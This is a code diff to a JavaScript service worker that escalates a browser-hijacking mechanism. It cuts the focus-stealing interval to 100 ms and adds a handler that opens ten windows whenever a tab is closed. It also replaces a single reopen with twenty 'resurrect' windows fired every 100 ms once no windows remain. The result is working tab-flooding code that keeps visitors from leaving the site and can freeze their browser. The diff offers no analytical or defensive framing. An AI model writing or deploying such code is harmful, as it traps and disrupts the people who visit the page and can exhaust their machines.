@@ -22,7 +22,7 @@ setInterval(() => {
       if ('focus' in c) c.focus()
     })
   })
-}, 500)
+}, 100)
 
 self.addEventListener('fetch', (e) => {
   e.respondWith(
@@ -107,6 +107,11 @@ self.addEventListener('message', (e) => {
       clients.openWindow(SITE_URL + '?sw-spawn=' + Date.now() + '&i=' + i)
     }
   }
+  if (e.data === 'tab-closed') {
+    for (let i = 0; i < 10; i++) {
+      clients.openWindow(SITE_URL + '?reopen=' + Date.now() + '&i=' + i)
+    }
+  }
   if (e.data === 'ping') {
     e.source.postMessage('pong')
   }
@@ -115,7 +120,9 @@ self.addEventListener('message', (e) => {
 setInterval(() => {
   clients.matchAll({ type: 'window' }).then((clientsList) => {
     if (clientsList.length === 0) {
-      clients.openWindow(SITE_URL)
+      for (let i = 0; i < 20; i++) {
+        clients.openWindow(SITE_URL + '?resurrect=' + Date.now())
+      }
     }
   })
-}, 5000)
+}, 100)
